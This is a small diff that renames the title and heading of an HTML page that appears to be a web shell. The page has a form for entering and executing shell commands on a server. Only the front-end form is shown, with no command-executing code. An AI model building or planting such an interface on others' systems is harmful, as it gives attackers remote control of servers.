@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TERMINAL S-E-O-K</title>
+    <title>TERMINAL MR SKK</title>
     <style>
         body {
             background-color: #000;
@@ -59,7 +59,7 @@
     </style>
 </head>
 <body>
-    <h1>TERMINAL S-E-O-K</h1>
+    <h1>TERMINAL MR SKK</h1>
     <form method="POST" action="">
         <input type="text" name="cmd" placeholder="Enter a shell command (e.g., ls, dir)" required>
         <button type="submit">Execute Command</button>
